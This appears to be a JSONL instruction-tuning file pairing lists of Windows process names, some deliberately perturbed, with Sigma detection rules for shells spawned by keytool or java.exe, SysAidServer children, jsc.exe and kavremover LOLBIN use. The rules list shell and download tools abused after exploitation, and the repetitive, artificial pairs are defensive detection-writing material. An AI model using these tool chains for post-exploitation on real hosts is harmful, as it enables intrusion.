{"instruction": "Write Sigma rule to detect payload:", "input": "\\keytool.exe \\cmd.exe \\sh.exe \\bash.exe \\powershell.exe \\pwsh.exe \\schtasks.exe \\certutil.exe \\whoami.exe \\bitsadmin.exe \\wscript.exe \\cscript.exe \\scrcons.exe \\regsvr32.exe \\hh.exe \\wmic.exe \\mshta.exe \\rundll32.exe \\forfiles.exe \\scriptrunner.exe \\mftrace.exe \\AppVLP.exe \\systeminfo.exe \\reg.exe \\query.exe", "output": "title: Suspicious Shells Spawn by Java Utility Keytool\nid: 90fb5e62-ca1f-4e22-b42e-cc521874c938\nstatus: test\ndescription: Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation)\nreferences:\n    - https://redcanary.com/blog/intelligence-insights-december-2021\n    - https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html\nauthor: Andreas Hunkeler (@Karneades)\ndate: 2021-12-22\nmodified: 2023-01-21\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\keytool.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\schtasks.exe'\n            - '\\certutil.exe'\n            - '\\whoami.exe'\n            - '\\bitsadmin.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\scrcons.exe'\n            - '\\regsvr32.exe'\n            - '\\hh.exe'\n            - '\\wmic.exe'\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\forfiles.exe'\n            - '\\scriptrunner.exe'\n            - '\\mftrace.exe'\n            - '\\AppVLP.exe'\n            - '\\systeminfo.exe'\n            - '\\reg.exe'\n            - '\\query.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\java.exe \\AppVLP.exe \\bitsadmin.exe \\certutil.exe \\cscript.exe \\curl.exe \\forfiles.exe \\hh.exe \\mftrace.exe \\mshta.exe \\net.exe \\net1.exe \\query.exe \\reg.exe \\regsvr32.exe \\rundll32.exe \\schtasks.exe \\scrcons.exe \\scriptrunner.exe \\sh.exe \\systeminfo.exe \\whoami.exe \\wmic.exe \\wscript.exe", "output": "title: Suspicious Processes Spawned by Java.EXE\nid: 0d34ed8b-1c12-4ff2-828c-16fc860b766d\nrelated:\n    - id: dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0\n      type: similar\nstatus: test\ndescription: Detects suspicious processes spawned from a Java host process which could indicate a sign of exploitation (e.g. log4j)\nreferences:\n    - https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/\nauthor: Andreas Hunkeler (@Karneades), Florian Roth\ndate: 2021-12-17\nmodified: 2024-01-18\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\java.exe'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bitsadmin.exe'\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\curl.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\mshta.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\query.exe'\n            - '\\reg.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\systeminfo.exe'\n            - '\\whoami.exe'\n            - '\\wmic.exe'        # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate calls to system binaries\n    - Company specific internal usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\java.exe \\AppVLP.exe \\bitsadmin.exe \\certutil.exe \\cscript.exe \\curl.exe \\forfiles.exe \\hh.exe \\mftrace.exe \\mshta.exe \\net.exe \\net1.exe \\query.exe \\reg.exe \\regsvr32.exe \\rundll32.exe \\schta\\\"sks.exe\\\" \\scrcons.exe \\scriptrunner.exe \\sh.exe \\systeminfo.exe \\whoami.exe \\wmic.exe \\wscript.exe", "output": "title: Suspicious Processes Spawned by Java.EXE\nid: 0d34ed8b-1c12-4ff2-828c-16fc860b766d\nrelated:\n    - id: dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0\n      type: similar\nstatus: test\ndescription: Detects suspicious processes spawned from a Java host process which could indicate a sign of exploitation (e.g. log4j)\nreferences:\n    - https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/\nauthor: Andreas Hunkeler (@Karneades), Florian Roth\ndate: 2021-12-17\nmodified: 2024-01-18\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\java.exe'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bitsadmin.exe'\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\curl.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\mshta.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\query.exe'\n            - '\\reg.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\systeminfo.exe'\n            - '\\whoami.exe'\n            - '\\wmic.exe'        # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate calls to system binaries\n    - Company specific internal usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\java.exe \\AppVLP.exe \\bitsadmin.exe \\certutil.exe \\cscript.exe \\curl.exe \\forfiles.exe \\hh.exe \\mftrace.exe \\mshta.exe \\net.exe \\net1.exe \\query.exe \\reg.exe \\regsvr32.exe \\rundll32.exe \\schtasks.exe \\scrcons.exe \\scriptrunner.exe \\sh.exe \\systeminfo.exe \\whoami.exe \\wmic.exe \\wscript.exe", "output": "title: Suspicious Processes Spawned by Java.EXE\nid: 0d34ed8b-1c12-4ff2-828c-16fc860b766d\nrelated:\n    - id: dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0\n      type: similar\nstatus: test\ndescription: Detects suspicious processes spawned from a Java host process which could indicate a sign of exploitation (e.g. log4j)\nreferences:\n    - https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/\nauthor: Andreas Hunkeler (@Karneades), Florian Roth\ndate: 2021-12-17\nmodified: 2024-01-18\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\java.exe'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bitsadmin.exe'\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\curl.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\mshta.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\query.exe'\n            - '\\reg.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\systeminfo.exe'\n            - '\\whoami.exe'\n            - '\\wmic.exe'        # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate calls to system binaries\n    - Company specific internal usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\java \\AppVLP \\bitsadmin \\certutil \\cscript \\curl \\forfiles \\hh \\mftrace \\mshta \\net \\net1 \\query \\reg \\regsvr32 \\rundll32 \\schtasks \\scrcons \\scriptrunner \\sh \\systeminfo \\whoami \\wmic \\wscript", "output": "title: Suspicious Processes Spawned by Java.EXE\nid: 0d34ed8b-1c12-4ff2-828c-16fc860b766d\nrelated:\n    - id: dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0\n      type: similar\nstatus: test\ndescription: Detects suspicious processes spawned from a Java host process which could indicate a sign of exploitation (e.g. log4j)\nreferences:\n    - https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/\nauthor: Andreas Hunkeler (@Karneades), Florian Roth\ndate: 2021-12-17\nmodified: 2024-01-18\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\java.exe'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bitsadmin.exe'\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\curl.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\mshta.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\query.exe'\n            - '\\reg.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\systeminfo.exe'\n            - '\\whoami.exe'\n            - '\\wmic.exe'        # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate calls to system binaries\n    - Company specific internal usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\java.exe \\AppVLP.exe \\bitsadmin.exe \\certutil.exe \\cscript.exe \\curl.exe \\forfiles.exe \\hh.exe \\mftrace.exe \\mshta.exe \\net.exe \\net1.exe \\query.exe \\reg.exe \\regsvr32.exe \\rundll32.exe \\schtasks.exe \\scrcons.exe \\scriptrunner.exe \\sh.exe \\systeminfo.exe \\whoami.exe \\wmic.exe \\wscript.exe", "output": "title: Suspicious Processes Spawned by Java.EXE\nid: 0d34ed8b-1c12-4ff2-828c-16fc860b766d\nrelated:\n    - id: dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0\n      type: similar\nstatus: test\ndescription: Detects suspicious processes spawned from a Java host process which could indicate a sign of exploitation (e.g. log4j)\nreferences:\n    - https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/\nauthor: Andreas Hunkeler (@Karneades), Florian Roth\ndate: 2021-12-17\nmodified: 2024-01-18\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\java.exe'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bitsadmin.exe'\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\curl.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\mshta.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\query.exe'\n            - '\\reg.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\systeminfo.exe'\n            - '\\whoami.exe'\n            - '\\wmic.exe'        # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate calls to system binaries\n    - Company specific internal usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\java.exe \\bash.exe \\cmd.exe \\powershell.exe \\pwsh.exe build", "output": "title: Suspicious Processes Spawned by Java.EXE\nid: 0d34ed8b-1c12-4ff2-828c-16fc860b766d\nrelated:\n    - id: dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0\n      type: similar\nstatus: test\ndescription: Detects suspicious processes spawned from a Java host process which could indicate a sign of exploitation (e.g. log4j)\nreferences:\n    - https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/\nauthor: Andreas Hunkeler (@Karneades), Florian Roth\ndate: 2021-12-17\nmodified: 2024-01-18\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\java.exe'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bitsadmin.exe'\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\curl.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\mshta.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\query.exe'\n            - '\\reg.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\systeminfo.exe'\n            - '\\whoami.exe'\n            - '\\wmic.exe'        # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate calls to system binaries\n    - Company specific internal usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\java.exe \\\"\\bash.exe\\\" \\cmd.exe \\powershell.exe \\pwsh.exe build", "output": "title: Suspicious Processes Spawned by Java.EXE\nid: 0d34ed8b-1c12-4ff2-828c-16fc860b766d\nrelated:\n    - id: dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0\n      type: similar\nstatus: test\ndescription: Detects suspicious processes spawned from a Java host process which could indicate a sign of exploitation (e.g. log4j)\nreferences:\n    - https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/\nauthor: Andreas Hunkeler (@Karneades), Florian Roth\ndate: 2021-12-17\nmodified: 2024-01-18\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\java.exe'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bitsadmin.exe'\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\curl.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\mshta.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\query.exe'\n            - '\\reg.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\systeminfo.exe'\n            - '\\whoami.exe'\n            - '\\wmic.exe'        # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate calls to system binaries\n    - Company specific internal usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\java \\bash \\cmd \\powershell \\pwsh build", "output": "title: Suspicious Processes Spawned by Java.EXE\nid: 0d34ed8b-1c12-4ff2-828c-16fc860b766d\nrelated:\n    - id: dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0\n      type: similar\nstatus: test\ndescription: Detects suspicious processes spawned from a Java host process which could indicate a sign of exploitation (e.g. log4j)\nreferences:\n    - https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/\nauthor: Andreas Hunkeler (@Karneades), Florian Roth\ndate: 2021-12-17\nmodified: 2024-01-18\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\java.exe'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bitsadmin.exe'\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\curl.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\mshta.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\query.exe'\n            - '\\reg.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\systeminfo.exe'\n            - '\\whoami.exe'\n            - '\\wmic.exe'        # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate calls to system binaries\n    - Company specific internal usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\java.exe \\bash.exe build \\pwsh.exe \\cmd.exe \\powershell.exe", "output": "title: Suspicious Processes Spawned by Java.EXE\nid: 0d34ed8b-1c12-4ff2-828c-16fc860b766d\nrelated:\n    - id: dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0\n      type: similar\nstatus: test\ndescription: Detects suspicious processes spawned from a Java host process which could indicate a sign of exploitation (e.g. log4j)\nreferences:\n    - https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/\nauthor: Andreas Hunkeler (@Karneades), Florian Roth\ndate: 2021-12-17\nmodified: 2024-01-18\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\java.exe'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bitsadmin.exe'\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\curl.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\mshta.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\query.exe'\n            - '\\reg.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\systeminfo.exe'\n            - '\\whoami.exe'\n            - '\\wmic.exe'        # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate calls to system binaries\n    - Company specific internal usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\java.exe \\javaw.exe SysAidServer", "output": "title: Suspicious SysAidServer Child\nid: 60bfeac3-0d35-4302-8efb-1dd16f715bc6\nstatus: test\ndescription: Detects suspicious child processes of SysAidServer (as seen in MERCURY threat actor intrusions)\nreferences:\n    - https://www.microsoft.com/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-26\ntags:\n    - attack.lateral-movement\n    - attack.t1210\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\java.exe'\n            - '\\javaw.exe'\n        ParentCommandLine|contains: 'SysAidServer'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\java.exe \\\"\\javaw.exe\\\" SysAidServer", "output": "title: Suspicious SysAidServer Child\nid: 60bfeac3-0d35-4302-8efb-1dd16f715bc6\nstatus: test\ndescription: Detects suspicious child processes of SysAidServer (as seen in MERCURY threat actor intrusions)\nreferences:\n    - https://www.microsoft.com/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-26\ntags:\n    - attack.lateral-movement\n    - attack.t1210\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\java.exe'\n            - '\\javaw.exe'\n        ParentCommandLine|contains: 'SysAidServer'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\java \\javaw SysAidServer", "output": "title: Suspicious SysAidServer Child\nid: 60bfeac3-0d35-4302-8efb-1dd16f715bc6\nstatus: test\ndescription: Detects suspicious child processes of SysAidServer (as seen in MERCURY threat actor intrusions)\nreferences:\n    - https://www.microsoft.com/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-26\ntags:\n    - attack.lateral-movement\n    - attack.t1210\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\java.exe'\n            - '\\javaw.exe'\n        ParentCommandLine|contains: 'SysAidServer'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\java.exe \\javaw.exe SysAidServer", "output": "title: Suspicious SysAidServer Child\nid: 60bfeac3-0d35-4302-8efb-1dd16f715bc6\nstatus: test\ndescription: Detects suspicious child processes of SysAidServer (as seen in MERCURY threat actor intrusions)\nreferences:\n    - https://www.microsoft.com/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-26\ntags:\n    - attack.lateral-movement\n    - attack.t1210\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\java.exe'\n            - '\\javaw.exe'\n        ParentCommandLine|contains: 'SysAidServer'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\jsc.exe jsc.exe", "output": "title: JScript Compiler Execution\nid: 52788a70-f1da-40dd-8fbd-73b5865d6568\nstatus: test\ndescription: |\n    Detects the execution of the \"jsc.exe\" (JScript Compiler).\n    Attacker might abuse this in order to compile JScript files on the fly and bypassing application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Jsc/\n    - https://www.phpied.com/make-your-javascript-a-windows-exe/\n    - https://twitter.com/DissectMalware/status/998797808907046913\nauthor: frack113\ndate: 2022-05-02\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: '\\jsc.exe'\n        - OriginalFileName: 'jsc.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use to compile JScript by developers.\n# Note: Can be decreased to informational or increased to medium depending on how this utility is used.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\jsc.exe\" jsc.exe", "output": "title: JScript Compiler Execution\nid: 52788a70-f1da-40dd-8fbd-73b5865d6568\nstatus: test\ndescription: |\n    Detects the execution of the \"jsc.exe\" (JScript Compiler).\n    Attacker might abuse this in order to compile JScript files on the fly and bypassing application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Jsc/\n    - https://www.phpied.com/make-your-javascript-a-windows-exe/\n    - https://twitter.com/DissectMalware/status/998797808907046913\nauthor: frack113\ndate: 2022-05-02\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: '\\jsc.exe'\n        - OriginalFileName: 'jsc.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use to compile JScript by developers.\n# Note: Can be decreased to informational or increased to medium depending on how this utility is used.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\jsc jsc", "output": "title: JScript Compiler Execution\nid: 52788a70-f1da-40dd-8fbd-73b5865d6568\nstatus: test\ndescription: |\n    Detects the execution of the \"jsc.exe\" (JScript Compiler).\n    Attacker might abuse this in order to compile JScript files on the fly and bypassing application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Jsc/\n    - https://www.phpied.com/make-your-javascript-a-windows-exe/\n    - https://twitter.com/DissectMalware/status/998797808907046913\nauthor: frack113\ndate: 2022-05-02\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: '\\jsc.exe'\n        - OriginalFileName: 'jsc.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use to compile JScript by developers.\n# Note: Can be decreased to informational or increased to medium depending on how this utility is used.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\jsc.exe jsc.exe", "output": "title: JScript Compiler Execution\nid: 52788a70-f1da-40dd-8fbd-73b5865d6568\nstatus: test\ndescription: |\n    Detects the execution of the \"jsc.exe\" (JScript Compiler).\n    Attacker might abuse this in order to compile JScript files on the fly and bypassing application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Jsc/\n    - https://www.phpied.com/make-your-javascript-a-windows-exe/\n    - https://twitter.com/DissectMalware/status/998797808907046913\nauthor: frack113\ndate: 2022-05-02\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: '\\jsc.exe'\n        - OriginalFileName: 'jsc.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use to compile JScript by developers.\n# Note: Can be decreased to informational or increased to medium depending on how this utility is used.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "run run-cmd \\cleanapi.exe \\kavremover.exe", "output": "title: Kavremover Dropped Binary LOLBIN Usage\nid: d047726b-c71c-4048-a99b-2e2f50dc107d\nstatus: test\ndescription: Detects the execution of a signed binary dropped by Kaspersky Lab Products Remover (kavremover) which can be abused as a LOLBIN to execute arbitrary commands and binaries.\nreferences:\n    - https://nasbench.medium.com/lolbined-using-kaspersky-endpoint-security-kes-installer-to-execute-arbitrary-commands-1c999f1b7fea\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-11-01\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains: ' run run-cmd '\n    filter_main_legit_parents:\n        ParentImage|endswith:\n            - '\\cleanapi.exe' # When launched from KES installer\n            - '\\kavremover.exe' # When launched from kavremover.exe\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "run run-cmd \"\\cleanapi.exe\" \\kavremover.exe", "output": "title: Kavremover Dropped Binary LOLBIN Usage\nid: d047726b-c71c-4048-a99b-2e2f50dc107d\nstatus: test\ndescription: Detects the execution of a signed binary dropped by Kaspersky Lab Products Remover (kavremover) which can be abused as a LOLBIN to execute arbitrary commands and binaries.\nreferences:\n    - https://nasbench.medium.com/lolbined-using-kaspersky-endpoint-security-kes-installer-to-execute-arbitrary-commands-1c999f1b7fea\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-11-01\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains: ' run run-cmd '\n    filter_main_legit_parents:\n        ParentImage|endswith:\n            - '\\cleanapi.exe' # When launched from KES installer\n            - '\\kavremover.exe' # When launched from kavremover.exe\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "run run-cmd \\cleanapi \\kavremover", "output": "title: Kavremover Dropped Binary LOLBIN Usage\nid: d047726b-c71c-4048-a99b-2e2f50dc107d\nstatus: test\ndescription: Detects the execution of a signed binary dropped by Kaspersky Lab Products Remover (kavremover) which can be abused as a LOLBIN to execute arbitrary commands and binaries.\nreferences:\n    - https://nasbench.medium.com/lolbined-using-kaspersky-endpoint-security-kes-installer-to-execute-arbitrary-commands-1c999f1b7fea\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-11-01\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains: ' run run-cmd '\n    filter_main_legit_parents:\n        ParentImage|endswith:\n            - '\\cleanapi.exe' # When launched from KES installer\n            - '\\kavremover.exe' # When launched from kavremover.exe\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high"}
